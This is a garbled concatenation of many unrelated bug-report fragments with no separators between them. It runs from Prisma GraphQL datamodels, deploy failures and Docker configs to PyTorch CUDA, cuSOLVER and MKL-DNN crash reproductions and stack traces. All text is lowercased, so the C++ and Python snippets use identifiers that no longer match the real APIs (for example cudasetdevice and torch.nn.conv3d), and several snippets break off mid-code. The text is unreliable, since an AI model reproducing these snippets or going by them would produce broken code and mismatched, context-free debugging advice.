delete from `test@dev`.`_userfollow` where `test@dev`.`_userfollow`.`b` = 'x'
``` so it deletes all relations that x is following
i created a repository containing a simple demonstration of this bug, which you can clone, run, and verify this issue against
the queries in "queries.txt" are meant to be run in the graphql playground
it is located here:
create a schema with the initial state and do a prisma deploy.
update the schema with new order schema.
it should stall on prisma deploy.
create a datamodel with uuid
`type user { id: uuid! @unique name: string!
create a record in the playground
`mutation { createuser(data: { name: "john" }) { id name }
`{ "data": { "createuser": { "id": "8c3fde44-b096-43b2-82a2-e766800bfceb", "name": "john" } }
try to delete it
`mutation { deleteuser(where:{id:"8c3fde44-b096-43b2-82a2-e766800bfceb"}) { id name }
}` `{ "data": { "deleteuser": null }, "errors": [ { "message": "whoops
looks like an internal server error
search your server logs for request id: local:api:cjjxtfsij000m0839w20gmiit", "path": [ "deleteuser" ], "locations": [ { "line": 2, "column": 3 } ], "requestid": "local:api:cjjxtfsij000m0839w20gmiit" } ]
my docker yaml
version: \'3\' services: # sql and document data store db: image: db build: context: ./images/db tmpfs: - /tmp - /var/run/postgresql volumes: - db:/var/lib/postgresql/data - ./postgres-initdb.sh:/docker-entrypoint-initdb.d/initdb.sh - ./seeds:/seeds ports: - "127.0.0.1:5432:5432" # you can override it via docker-compose.override.yml # prisma prisma: image: prismagraphql/prisma:1.12 restart: always ports: - "4466:4466" environment: prisma_config: | port: 4466 # uncomment the next line and provide the env var prisma_management_api_secret=my-secret to activate cluster security # managementapisecret: my-secret databases: default: connector: postgres host: db port: \'5432\' user: root password: \'\' database: realadvisor schema: public migrations: false # distributed in-memory cache redis: image: redis:*** read_only: true volumes: - redis:/data user: redis volumes: db: redis: yarn: ``` my prisma yml ```
endpoint:
datamodel: datamodel.graphql
clone the repo [prisma-boilerplate](
run the prisma deploy
prisma will stuck on the `apply changes`
use a pagination filter first or last with value 1
the following datamodel.graphql excerpt was generated from an existing postgres database
it is however not valid upon attempting to run `prisma deploy`
type account @pgtable(name: "account") { id: id! @unique @default(value: uuid_generate_v4())
this is not very consistent
this usually happens when there is a long time no activity on both servers, for example, on one is accessing the server at night, and in the morning i would see this kind of behavior
but it will fix itself, if i create more messages, then it will start working again
this is really weird, and this only happens on the server that's actually creating the message
could the processing on the server interfere with the async iterator of the subscription in any way?
go to your `prisma.yml` file and add a [server side subscription]( #prisma.yml)
do `prisma deploy` and try to invoke your subscription
console log the headers on the webhook and you will see that the ones you added to the configuration file are not being sent.
deploy any prisma service on [heroku](
run `prisma seed`
i will provide a reproduction soon.
on an older prisma version (e.g
1.5.), create a node with scalar list values
delete that node afterwards.
export from this version.
import it into a recent prisma version, e.g
the import will crash, because the export contains the scalar list values for the node that has been deleted.
run `prisma init` and choose to deploy to a demo server.
run `prisma deploy`.
the deploy fails with an error because no workspace slug is included in the url in the `prisma.yml`: ```
the provided endpoint points to a demo cluster, but is missing the workspace slug
a valid demo endpoint looks like this:
the following schema generates the error `type myrelationtypepreviousvalues must define one or more fields` ``` graphql
type mydatatype { """ fields..
""" onerelations: [myrelationtype !]! @relation(name: "relationone") tworelations: [myrelationtype !]! @relation(name: "relationtwo")
} type myrelationtype { one: item! @relation(name: "relationone") two: item! @relation(name: "relationtwo")
`prisma.yml`
datamodel: `d.graphql`
a valid `datamodel.graphql`
run prisma deploy and fill it with the following
<img width="1230" alt="screen shot 2018-06-29 at 2 27 52 pm" src=" ">
`prisma.yml` will have `endpoint: ` because the defaults are missing
running `prisma deploy` again works as defaults kick in but the appended url is incorrect.
set up a new prisma api with this datamodel: ```graphql
type family { id: id! @unique createdat: datetime! updatedat: datetime! oldid: string accommodationoptions: [accommodationoption!]!
} type accommodationoption { id: id! @unique createdat: datetime! updatedat: datetime! price: float!
run `prisma deploy`
navigate to the endpoint, and in the playground schema search for "magical": ![image]( you\'ll find 3 types: * `_magicalbackrelation_accommodationoptiontofamily_every`
* `_magicalbackrelation_accommodationoptiontofamily_some`
* `_magicalbackrelation_accommodationoptiontofamily_none` they are exposed in the type `familywhereinput`.
set up a prisma project with a self hosted database on heroku using [heroku postgres hobby plan](
lift your docker image locally and try to deploy locally by doing `prisma deploy`
check docker container errors with `docker logs yourcontainername` ```
severe: connection error: org.postgresql.util.psqlexception: fatal: too many connections for role "ximdxudtymukbs"
at org.postgresql.core.v3.queryexecutorimpl.receiveerrorresponse(queryexecutorimpl.java:2433)
at org.postgresql.core.v3.queryexecutorimpl.readstartupmessages(queryexecutorimpl.java:2566)
at org.postgresql.core.v3.queryexecutorimpl.<init>(queryexecutorimpl.java:131)
at org.postgresql.core.v3.connectionfactoryimpl.openconnectionimpl(connectionfactoryimpl.java:210)
at org.postgresql.core.connectionfactory.openconnection(connectionfactory.java:49)
at org.postgresql.jdbc.pgconnection.<init>(pgconnection.java:195)
at org.postgresql.driver.makeconnection(driver.java:452)
at org.postgresql.driver.connect(driver.java:254)
at slick.jdbc.driverdatasource.getconnection(driverdatasource.scala:101)
at com.zaxxer.hikari.pool.poolbase.newconnection(poolbase.java:341)
at com.zaxxer.hikari.pool.poolbase.newpoolentry(poolbase.java:193)
at com.zaxxer.hikari.pool.hikaripool.createpoolentry(hikaripool.java:430)
at com.zaxxer.hikari.pool.hikaripool.access$500(hikaripool.java:64)
at com.zaxxer.hikari.pool.hikaripool$poolentrycreator.call(hikaripool.java:570)
at com.zaxxer.hikari.pool.hikaripool$poolentrycreator.call(hikaripool.java:563)
at java.util.concurrent.futuretask.run(futuretask.java:266)
at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149)
at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624)
at java.lang.thread.run(thread.java:748)
and not able to get my local server running.
follow the quickstart guide and deploy on demo server
successful deploy with demo schema, playground works
edit datamodel.graphql with the following : ```
type user { id: id! @unique role: role! @default(value: "user") locale: string createdat: datetime! updatedat: datetime! pushnotificationstoken: string pictures: [string!]! phone: string @unique name: string! code: int codevalid: boolean about: string birthday: string! gender: string town: string school: string work: string following: [user!]! @relation(name: "userfollow") followers: [user!]! @relation(name: "userfollow") friends: [user!]! @relation(name: "userfriends") pinscreated: [pin!]! @relation(name: "creatorpins", ondelete: cascade) pinsfollowing: [pin!]! @relation(name: "pinuserfollow", ondelete: set_null) attending: [eventdetails!]! groups: [group!]! @relation(name: "groupuser", ondelete: set_null) messages: [message!]! @relation(name: "messageauthor", ondelete: cascade) sentrequests: [request!]! @relation(name: "requestsender", ondelete: cascade) receivedrequests: [request!]! @relation(name: "requestreceiver", ondelete: cascade) # will change to userlocation currentplaceid: string currentplacename: string # preferences showage: boolean! @default(value: "true") # settings privatemessagenotif: boolean! @default(value: "true") # new group message newmessagenotif: boolean! @default(value: "true") # new pin message on a followed pin pinnotif: boolean! @default(value: "true") # a pin is hot nearby neweventnotif: boolean! @default(value: "true") # an event is starting nearby friendrequestnotif: boolean! @default(value: "true") newmessagefriendnotif: boolean! @default(value: "true") # a friend posted on a pin blockprivatemessages: boolean! @default(value: "false") activity: [activity!]! @relation(name: "useractivity", ondelete: cascade) blockedusers: [string!]!
} type activity { id: id! @unique createdat: datetime! user: user @relation(name: "useractivity", ondelete: set_null) pin: pin! @relation(name: "pinactivity", ondelete: set_null) action: action!
} type pin { id: id! @unique createdat: datetime! updatedat: datetime! name: string description: string picture: string lat: float! lng: float! followers: [user!]! @relation(name: "pinuserfollow") createdby: user @relation(name: "creatorpins") messages: [message!]! @relation(name: "pinmessages", ondelete: cascade) type: type! @default(value: "talk") # talk : conversation created on the map, event will have eventdetails, or place (fetch from google) eventdetails: eventdetails @relation(name: "pineventdetails", ondelete: cascade) # get details if pin type is event placeid: string @unique # if pin type is place only activity: [activity!]! @relation(name: "pinactivity", ondelete: cascade)
} type eventdetails { id: id! @unique placeid: string # where is the event happening starts: datetime! ends: datetime! ticketsurl: string attending: [user!]! pin: pin! @relation(name: "pineventdetails")
} type request { id: id! @unique createdat: datetime! updatedat: datetime! sender: user! @relation(name: "requestsender", ondelete: set_null) receiver: user! @relation(name: "requestreceiver", ondelete: set_null) group: group @relation(name: "requestgroup", ondelete: set_null) status: status! @default(value: "pending") permission: permission!
} type group { id: id! @unique createdat: datetime! updatedat: datetime! name: string picture: string messages: [message!]! @relation(name: "groupmessages", ondelete: cascade) users: [user!]! @relation(name: "groupuser", ondelete: set_null) request: request @relation(name: "requestgroup", ondelete: cascade)
} type message { id: id! @unique createdat: datetime! sentby: user @relation(name: "messageauthor", ondelete: set_null) text: string image: string # can be from a pin or group pin: pin @relation(name: "pinmessages", ondelete: set_null) group: group @relation(name: "groupmessages", ondelete: set_null) # can be an invitation to check out a pin so pinid invitation: string
} type file { id: id! @unique name: string! size: int! secret: string! @unique contenttype: string! createdat: datetime! updatedat: datetime! url: string! @unique
} enum type { talk place event
} enum permission { friend message
} enum role { user blocked admin
} enum status { pending accepted refused
} enum action { created joined followed attended
run prisma deploy => success 5
run prisma playground => server cannot be reached
create the prisma docker container using the included `docker-compose.yml` and `datamodel.graphql`
create the database and initialize it with some data
`prisma deploy`
`prisma playground`
enter in the included query
error is visible in `docker logs <container_name>`
follow the linked tutorial exactly to step 12
run `prisma deploy`
upgrade from an older version of prisma sudo -h npm install -g --update prisma 2
see error /usr/bin/prisma -> /usr/lib/node_modules/prisma/dist/index.js > prisma@1.9.0 postinstall /usr/lib/node_modules/prisma
> prisma init-prisma || echo "" syntaxerror: unexpected token { at exports.runinthiscontext (vm.js:53:16) at module._compile (module.js:387:25) at object.module._extensions..js (module.js:422:10) at module.load (module.js:357:32) at function.module._load (module.js:314:12) at module.require (module.js:367:17) at require (internal/module.js:20:19) at function.promptmodule.restoredefaultprompts (/usr/lib/node_modules/prisma/node_modules/inquirer/lib/inquirer.js:55:33) at object.inquirer.createpromptmodule (/usr/lib/node_modules/prisma/node_modules/inquirer/lib/inquirer.js:65:16) at object.<anonymous> (/usr/lib/node_modules/prisma/node_modules/inquirer/lib/inquirer.js:77:28) /usr/lib
prisma@1.9.0 prisma-cli-core@1.0.46 download-github-repo@0.1.4 download@6.2.5 decompress@4.2.0 decompress-tarbz2@4.1.1 unbzip2-stream@1.2.5 buffer@3.6.0 ieee754@1.1.12 decompress-unzip@4.0.1 yauzl@2.9.2 fd-slicer@1.1.0 ext-name@5.0.0 ext-list@2.2.2 mime-db@1.34.0 filenamify@2.1.0 express@4.16.3 accepts@1.3.5 mime-types@2.1.18 mime-db@1.33.0 express-request-proxy@2.1.0 request@2.87.0 http-signature@1.2.0 sshpk@1.14.2 find-up@2.1.0 locate-path@2.0.0 p-locate@2.0.0 p-limit@1.3.0 js-yaml@3.12.0 npm-run@4.1.2 prisma-db-introspection@0.0.14 prisma-yml@1.0.59 util.promisify@1.0.0 object.getownpropertydescriptors@2.0.3 es-abstract@1.12.0 has@1.0.3 prisma-cli-engine@1.0.48 ansi-styles@3.2.1 color-convert@1.9.2 color-name@1.1.1 jsonwebtoken@8.3.0 npm warn optional skipping failed optional dependency /prisma/chokidar/fsevents:
npm warn notsup not compatible with your operating system or architecture: fsevents@1.2.4
npm warn ajv-keywords@3.2.0 requires a peer of ajv@^6.0.0 but none was installed.
code to reproduce the issue was added by `eliaz` as well:
import torch
from torch.distributions import lowrankmultivariatenormal device = "cuda" torch.manual_seed(23)
for i in range(10): print(i) distrib = lowrankmultivariatenormal( torch.randn(1, 512, 512, 2).to(device), torch.randn(1, 512, 512, 2, 10).to(device), torch.randn(1, 512, 512, 2).to(device).exp() )
since the illegal memory access is not always triggered in the first run, multiple iterations were added
reproduced using pytorch `1.7.0.dev20200713+cuda10.2`
stack trace:
cuda runtime error: an illegal memory access was encountered (700) in magma_spotrf_batched at /opt/conda/conda-bld/magma-cuda102_1583546904148/work/src/spotrf_batched.cpp:234
cuda runtime error: an illegal memory access was encountered (700) in magma_queue_destroy_internal at /opt/conda/conda-bld/magma-cuda102_1583546904148/work/interface_cuda/interface.cpp:944
cuda runtime error: an illegal memory access was encountered (700) in magma_queue_destroy_internal at /opt/conda/conda-bld/magma-cuda102_1583546904148/work/interface_cuda/interface.cpp:945
cuda runtime error: an illegal memory access was encountered (700) in magma_queue_destroy_internal at /opt/conda/conda-bld/magma-cuda102_1583546904148/work/interface_cuda/interface.cpp:946
traceback (most recent call last): file "lowrank_cuda.py", line 12, in <module> torch.randn(1, 512, 512, 2).to(device).exp() file "/home/pbialecki/anaconda3/envs/pytorch_nightly/lib/python3.7/site-packages/torch/distributions/lowrank_multivariate_normal.py", line 108, in __init__ self._capacitance_tril = _batch_capacitance_tril(cov_factor, cov_diag) file "/home/pbialecki/anaconda3/envs/pytorch_nightly/lib/python3.7/site-packages/torch/distributions/lowrank_multivariate_normal.py", line 19, in _batch_capacitance_tril return torch.cholesky(k)
runtimeerror: cuda error: an illegal memory access was encountered
``` `cuda-gdb` output:
cuda exception: warp illegal address
the exception was triggered at pc thread 1 "python" received signal cuda_exception_14, warp illegal address.
[switching focus to cuda kernel 3, grid 50, block (0,0,0), thread (0,0,0), device 0, sm 0, warp 0, lane 0]
in spotf2_smlpout_anywidth_kernel_batched(int, int, float**, int, int, int, int, int, int*, int)<<<(1,1,1),(2,8,1)>>> ()
``` which seems to point to the [cholesky factorization]( #ga0d430425aee761779b9279681be31699)
cc @vincentqb @fritzo @neerajprad @alicanb @vishwakftw @ssnl @jianyuh
steps to reproduce the behavior: 1.paste the c++ code, name bind_cudevice.cc
2.compile bind_cudevice.cc with my g++ compile code
3.paste my python code named test.py
just run test.py and see bind_cudevice.cc
#include <iostream> #include <cublas_v2.h>
#include <cuda.h>
#include <cuda_runtime_api.h> #include <cusolverdn.h>
#include <cusolversp.h>
#include <cusolverrf.h> #include <pybind11/pybind11.h> class cudevice { public: cudevice() { initialized_ = true; cudasetdevice(0); cusolverdncreate(&cusolverdn_handle_); cusolverdnsetstream(cusolverdn_handle_, cudastreamperthread); } ~cudevice() { std::cout << "in ~cudevice" << std::endl; if (cusolverdn_handle_) { std::cout << "in ~cudevice and cusolverdn_handle_" << std::endl; cusolverdndestroy(cusolverdn_handle_); std::cout << "destory success" << std::endl; } } private: bool initialized_; cusolverdnhandle_t cusolverdn_handle_; }; int init_cudevice(){ thread_local cudevice a = cudevice(); std::cout << "hello world" << std::endl; return 0;
} pybind11_module(example, m) { m.def("init_cudevide", &init_cudevice, "select gpu id");
``` g++ compile code
``` g++ -o3 -wall -shared -std=c++11 -fpic -i/usr/include/python3.6m -i./third-party/pybind11-2.2.4/include -i/usr/local/cuda/include -wl,-rpath=/usr/local/cuda/lib64 -l/usr/local/cuda/lib64 -lcudart -lcusolver `python3 -m pybind11 --includes` binding_cudevice.cc -o example`python3-config --extension-suffix` ``` test.py
import torch
import example
example.init_cudevide()
``` ## core dump info
#0 in ?? () from /usr/local/cuda/lib64/libcusolver.so.10.0
#1 in ?? () from /usr/local/cuda/lib64/libcusolver.so.10.0
#2 in ?? () from /usr/local/cuda/lib64/libcusolver.so.10.0
#3 in cusolverdndestroy () from /usr/local/cuda/lib64/libcusolver.so.10.0
#4 in kaldi::cudevice::~cudevice (this= , __in_chrg=<optimized out>) at cu-device.cc:683
#5 in (anonymous namespace)::run (p=<optimized out>) at /home/nwani/m3/conda-bld/compilers_linux-64_1560109574129/work/.build/x86_64-conda_cos6-linux-gnu/src/gcc/libstdc++-v3/libsupc++/atexit_thread.cc:75
#6 in __run_exit_handlers () from /usr/lib64/libc.so.6
#7 in exit () from /usr/lib64/libc.so.6
#8 in __libc_start_main () from /usr/lib64/libc.so.6
#9 in _start ()
def diff_conv_half(): import torch for ch_in in range(2, 256): for ch_out in range(2, 256): conv = torch.nn.conv3d(ch_in, ch_out, kernel_size=(3, 1, 1), bias=false, padding=(1, 0, 0)).cuda().half() x = torch.rand(1, ch_in, 5, 7, 13).cuda().half() y_half = conv(x) conv = conv.float() x = x.float() y_full = conv(x) similarity = torch.nn.functional.cosine_similarity(y_half.float().view(1,-1), y_full.view(1,-1)).item() if (similarity < 1.0 - 1e-5): print("{0}\\t{1}\\t{2:.4f}".format(ch_in, ch_out, similarity))
```
steps to reproduce the behavior:
import numpy as np
import torch
img = np.zeros((2048,2048),dtype=np.float32)
img[500,300] = 1.0
psf_half = 25
conv_size = 2*psf_half+1
psf = np.ones((conv_size,conv_size), dtype = np.float32) weights_t = torch.tensor(psf[np.newaxis,np.newaxis,:,:]) #numpy to tensor
img_t = torch.tensor(img[np.newaxis,np.newaxis,:,:]) # batch size 1, 1 channel -- 1 color
img_conv_pytorch = torch.nn.functional.conv2d(img_t, weights_t, padding=psf_half)
process: python3.7 [29737]
path: /users/user/*/python3.7
identifier: python3.7
version: ???
code type: x86-64 (native)
parent process: bash [18756]
responsible: terminal [1449] date/time: 2020-06-10 15:57:17.206 -0700
os version: mac os x 10.15.5 (19f101)
report version: 12
bridge os version: 4.5 (17p5300) time awake since boot: 100000 seconds
time since wake: 18000 seconds system integrity protection: enabled crashed thread: 0 dispatch queue: com.apple.main-thread exception type: exc_bad_access (sigsegv)
exception codes: kern_invalid_address at
exception note: exc_corpse_notify termination signal: segmentation fault: 11
termination reason: namespace signal, code
terminating process: exc handler [29737] vm regions near : __linkedit 0000000118b6f000-000000011a040000 [ 20.8m] r--/rwx sm=cow /users/user/*/*.dylib
--> malloc_large 00007fc3cdc00000-00007fc3d5c00000 [128.0m] rw-/rwx sm=prv thread 0 crashed:: dispatch queue: com.apple.main-thread
0 libsystem_platform.dylib _platform_bzero$variant$haswell + 53
1 libtorch_cpu.dylib void mkldnn::impl::cpu::jit_gemm_convolution_utils::im2col<float>(mkldnn::impl::cpu::jit_gemm_conv_conf_t const&, float const*, float*, int, int, int, int) + 1588
2 libtorch_cpu.dylib mkldnn::impl::cpu::gemm_convolution_fwd_t::execute_forward() const::$_0::operator()(int, int) const::'lambda'(int, mkldnn::impl::cpu::(anonymous namespace)::im_pos_t const&, mkldnn::impl::cpu::(anonymous namespace)::im_pos_t&, mkldnn::impl::cpu::(anonymous namespace)::im_pos_t&, mkldnn::impl::cpu::(anonymous namespace)::im_pos_t const&)::operator()(int, mkldnn::impl::cpu::(anonymous namespace)::im_pos_t const&, mkldnn::impl::cpu::(anonymous namespace)::im_pos_t&, mkldnn::impl::cpu::(anonymous namespace)::im_pos_t&, mkldnn::impl::cpu::(anonymous namespace)::im_pos_t const&) const + 341
3 libtorch_cpu.dylib mkldnn::impl::cpu::gemm_convolution_fwd_t::execute_forward() const + 1627
4 libtorch_cpu.dylib mkldnn::impl::cpu::gemm_convolution_fwd_t::execute(mkldnn::impl::event_t*) const + 28
5 libtorch_cpu.dylib mkldnn::impl::cpu::cpu_engine_t::submit(mkldnn_primitive*, mkldnn::impl::event_t*, mkldnn::impl::nstl::vector<mkldnn::impl::event_t*>&) + 117
6 libtorch_cpu.dylib mkldnn::impl::stream_eager_t::submit_impl(unsigned long, unsigned long, mkldnn_primitive**) + 757
7 libtorch_cpu.dylib mkldnn_stream::submit(mkldnn::impl::nstl::vector<mkldnn_primitive*> const&, mkldnn_primitive**) + 274
8 libtorch_cpu.dylib mkldnn_stream_submit + 167
9 libtorch_cpu.dylib ideep::primitive_group::execute(ideep::stream&) + 74
10 libtorch_cpu.dylib void ideep::computation::execute<ideep::tensor, ideep::tensor>(ideep::tensor const&, ideep::tensor const&, ideep::tensor const&) + 95
11 libtorch_cpu.dylib void ideep::convolution_forward::compute_impl<at::native::allocformkldnn, false, mkldnn::algorithm&, mkldnn::prop_kind&, mkldnn::padding_kind&>(std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> >&, ideep::tensor const&, ideep::tensor const&, ideep::tensor const&, std::__1::vector<int, std::__1::allocator<int> > const&, ideep::tensor&, std::__1::vector<int, std::__1::allocator<int> > const&, std::__1::vector<int, std::__1::allocator<int> > const&, std::__1::vector<int, std::__1::allocator<int> > const&, std::__1::vector<int, std::__1::allocator<int> > const&, std::__1::vector<float, std::__1::allocator<float> > const&, std::__1::vector<float, std::__1::allocator<float> > const&, std::__1::vector<float, std::__1::allocator<float> > const&, ideep::descriptor_group::attr_t const&, ideep::lowp_kind, mkldnn::algorithm&, mkldnn::prop_kind&, mkldnn::padding_kind&) + 4954
12 libtorch_cpu.dylib void ideep::convolution_forward::compute<at::native::allocformkldnn, false>(std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> >&, ideep::tensor const&, ideep::tensor const&, ideep::tensor const&, std::__1::vector<int, std::__1::allocator<int> > const&, ideep::tensor&, std::__1::vector<int, std::__1::allocator<int> > const&, std::__1::vector<int, std::__1::allocator<int> > const&, std::__1::vector<int, std::__1::allocator<int> > const&, std::__1::vector<int, std::__1::allocator<int> > const&, int, std::__1::vector<float, std::__1::allocator<float> > const&, std::__1::vector<float, std::__1::allocator<float> > const&, std::__1::vector<float, std::__1::allocator<float> > const&, ideep::descriptor_group::attr_t const&, mkldnn::algorithm, mkldnn::prop_kind, mkldnn::padding_kind, ideep::lowp_kind) + 1113
13 libtorch_cpu.dylib void ideep::convolution_forward::compute<at::native::allocformkldnn, false>(ideep::tensor const&, ideep::tensor const&, ideep::tensor const&, std::__1::vector<int, std::__1::allocator<int> > const&, ideep::tensor&, std::__1::vector<int, std::__1::allocator<int> > const&, std::__1::vector<int, std::__1::allocator<int> > const&, std::__1::vector<int, std::__1::allocator<int> > const&, std::__1::vector<int, std::__1::allocator<int> > const&, int, ideep::descriptor_group::attr_t const&, mkldnn::algorithm, mkldnn::prop_kind, mkldnn::padding_kind) + 349
14 libtorch_cpu.dylib void ideep::convolution_forward::compute<at::native::allocformkldnn>(ideep::tensor const&, ideep::tensor const&, std::__1::vector<int, std::__1::allocator<int> > const&, ideep::tensor&, std::__1::vector<int, std::__1::allocator<int> > const&, std::__1::vector<int, std::__1::allocator<int> > const&, std::__1::vector<int, std::__1::allocator<int> > const&, std::__1::vector<int, std::__1::allocator<int> > const&, int, ideep::descriptor_group::attr_t const&, mkldnn::algorithm, mkldnn::prop_kind, mkldnn::padding_kind) + 243
15 libtorch_cpu.dylib at::native::_mkldnn_conv2d(ideep::tensor const&, ideep::tensor const&, c10::optional<ideep::tensor> const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, long long) + 5911
16 libtorch_cpu.dylib at::native::mkldnn_convolution(at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, long long) + 1903
17 libtorch_cpu.dylib at::typedefault::mkldnn_convolution(at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, long long) + 296
18 libtorch_cpu.dylib c10::detail::wrap_kernel_functor_unboxed_<c10::detail::wrapruntimekernelfunctor_<at::tensor (*)(at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, long long), at::tensor, c10::guts::typelist::typelist<at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, long long> >, at::tensor (at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, long long)>::call(c10::operatorkernel*, at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, long long) + 85
19 libtorch_cpu.dylib at::tensor c10::operatorhandle::callunboxed<at::tensor, at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, long long>(at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, long long) const + 515
20 libtorch_cpu.dylib torch::autograd::variabletype::mkldnn_convolution(at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, long long) + 4506
21 libtorch_cpu.dylib c10::detail::wrap_kernel_functor_unboxed_<c10::detail::wrapruntimekernelfunctor_<at::tensor (*)(at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, long long), at::tensor, c10::guts::typelist::typelist<at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, long long> >, at::tensor (at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, long long)>::call(c10::operatorkernel*, at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, long long) + 85
22 libtorch_cpu.dylib at::tensor c10::operatorhandle::callunboxed<at::tensor, at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, long long>(at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, long long) const + 515
23 libtorch_cpu.dylib at::native::_convolution(at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, bool, c10::arrayref<long long>, long long, bool, bool, bool) + 19400
24 libtorch_cpu.dylib at::typedefault::_convolution(at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, bool, c10::arrayref<long long>, long long, bool, bool, bool) + 401
25 libtorch_cpu.dylib torch::autograd::variabletype::_convolution(at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, bool, c10::arrayref<long long>, long long, bool, bool, bool) + 1668
26 libtorch_cpu.dylib c10::detail::wrap_kernel_functor_unboxed_<c10::detail::wrapruntimekernelfunctor_<at::tensor (*)(at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, bool, c10::arrayref<long long>, long long, bool, bool, bool), at::tensor, c10::guts::typelist::typelist<at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, bool, c10::arrayref<long long>, long long, bool, bool, bool> >, at::tensor (at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, bool, c10::arrayref<long long>, long long, bool, bool, bool)>::call(c10::operatorkernel*, at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, bool, c10::arrayref<long long>, long long, bool, bool, bool) + 159
27 libtorch_cpu.dylib at::tensor c10::operatorhandle::callunboxed<at::tensor, at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, bool, c10::arrayref<long long>, long long, bool, bool, bool>(at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, bool, c10::arrayref<long long>, long long, bool, bool, bool) const + 640
28 libtorch_cpu.dylib at::native::convolution(at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, bool, c10::arrayref<long long>, long long) + 341
29 libtorch_cpu.dylib at::typedefault::convolution(at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, bool, c10::arrayref<long long>, long long) + 347
30 libtorch_cpu.dylib torch::autograd::variabletype::convolution(at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, bool, c10::arrayref<long long>, long long) + 1141
31 libtorch_cpu.dylib c10::detail::wrap_kernel_functor_unboxed_<c10::detail::wrapruntimekernelfunctor_<at::tensor (*)(at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, bool, c10::arrayref<long long>, long long), at::tensor, c10::guts::typelist::typelist<at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, bool, c10::arrayref<long long>, long long> >, at::tensor (at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, bool, c10::arrayref<long long>, long long)>::call(c10::operatorkernel*, at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, bool, c10::arrayref<long long>, long long) + 117
32 libtorch_cpu.dylib at::tensor c10::operatorhandle::callunboxed<at::tensor, at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, bool, c10::arrayref<long long>, long long>(at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, bool, c10::arrayref<long long>, long long) const + 610
33 libtorch_cpu.dylib at::native::conv2d(at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, long long) + 281
34 libtorch_cpu.dylib at::typedefault::conv2d(at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, long long) + 296
35 libtorch_cpu.dylib torch::autograd::variabletype::conv2d(at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, long long) + 1110
